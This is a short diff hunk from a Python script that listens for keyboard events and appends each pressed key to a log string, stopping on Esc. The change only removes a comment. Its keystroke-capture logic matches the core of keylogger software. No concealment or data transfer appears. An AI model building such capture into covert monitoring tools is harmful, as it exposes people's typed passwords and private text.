@@ -10,7 +10,7 @@ def on_press(key):
         if key == keyboard.Key.space:
             log += " "  
         else:
-            log += f" [{key.name}] "  # Special keys (e.g., Enter, Shift)
+            log += f" [{key.name}] " 
 
 def on_release(key):
     if key == keyboard.Key.esc:
